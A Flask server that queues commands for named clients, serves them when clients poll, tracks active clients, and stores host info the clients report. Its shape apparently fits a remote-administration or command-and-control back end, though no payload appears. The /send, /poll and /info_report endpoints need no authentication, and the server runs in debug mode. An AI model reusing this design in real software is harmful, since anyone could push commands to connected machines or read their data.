from flask import Flask, request, jsonify
from threading import Lock, Thread
import time
import os

app = Flask(__name__)
commands = {}
active_users = {}
user_infos = {}
last_poll_times = {}
lock = Lock()

USER_TIMEOUT = 10
MIN_POLL_INTERVAL = 2.5

@app.route('/send', methods=['POST'])
def send_command():
    data = request.get_json()
    target = data.get('to')
    command = {
        "command": data.get('command'),
        "args": data.get('args')
    }

    if not target or not command["command"]:
        return jsonify({"error": "invalid cmd data"}), 400

    with lock:
        if target not in commands:
            commands[target] = []
        commands[target].append(command)

    return jsonify({"status": "queued", "to": target})

@app.route('/poll/<userid>')
def poll(userid):
    now = time.time()
    with lock:
        last_poll = last_poll_times.get(userid, 0)
        # Throttle too-frequent polling
        if now - last_poll < MIN_POLL_INTERVAL:
            return jsonify([])
        # Update user's last active time
        active_users[userid] = now
        last_poll_times[userid] = now
        # Get and clear commands for user
        cmds = commands.get(userid, [])
        commands[userid] = []
    print(f"[POLL] {userid} polled at {now}, returning {len(cmds)} commands")
    return jsonify(cmds)

@app.route('/active')
def get_active_users():
    now = time.time()
    with lock:
        # Remove timed-out users before returning active list
        expired = [uid for uid, ts in active_users.items() if now - ts > USER_TIMEOUT]
        for uid in expired:
            print(f"[TIMEOUT] {uid} removed after {now - active_users[uid]:.2f}s inactivity")
            active_users.pop(uid, None)
            user_infos.pop(uid, None)
        active_list = list(active_users.keys())
    print(f"[ACTIVE] {active_list}")
    return jsonify(active_list)

@app.route('/disconnect', methods=['POST'])
def disconnect():
    data = request.get_json()
    userid = data.get('userid')
    with lock:
        active_users.pop(userid, None)
        user_infos.pop(userid, None)
    print(f"[DISCONNECT] {userid} manually disconnected")
    return jsonify({"status": "disconnected", "userid": userid})

@app.route('/info_report', methods=['POST'])
def info_report():
    data = request.get_json()
    userid = data.get('userid')
    if not userid:
        return jsonify({"error": "missing userid"}), 400

    with lock:
        user_infos[userid] = data
    return jsonify({"status": "info saved", "userid": userid})

@app.route('/info_report/<userid>', methods=['GET'])
def get_info(userid):
    with lock:
        info = user_infos.get(userid)
    if not info:
        return jsonify({"error": "no info found"}), 404
    return jsonify(info)

@app.route('/clear_active', methods=['POST'])
def clear_active():
    data = request.get_json()
    
    received_key = data.get("key") if data else None
    expected_key = os.getenv("delkey")

    if not received_key:
        return jsonify({"error": "missing key"}), 403

    if received_key != expected_key:
        return jsonify({"error": "unauthorized"}), 403

    with lock:
        active_users.clear()
        user_infos.clear()
    print("db clear operation authorized!")
    return jsonify({"status": "cleared"}), 200

def cleanup_inactive_users():
    while True:
        time.sleep(1)
        now = time.time()
        with lock:
            expired = [uid for uid, last_seen in active_users.items() if now - last_seen > USER_TIMEOUT]
            for uid in expired:
                print(f"[TIMEOUT THREAD] {uid} removed after {now - active_users[uid]:.2f}s inactivity")
                active_users.pop(uid, None)
                user_infos.pop(uid, None)

print("[INIT] Starting cleanup thread")
Thread(target=cleanup_inactive_users, daemon=True).start()

if __name__ == '__main__':
    app.run(debug=True)
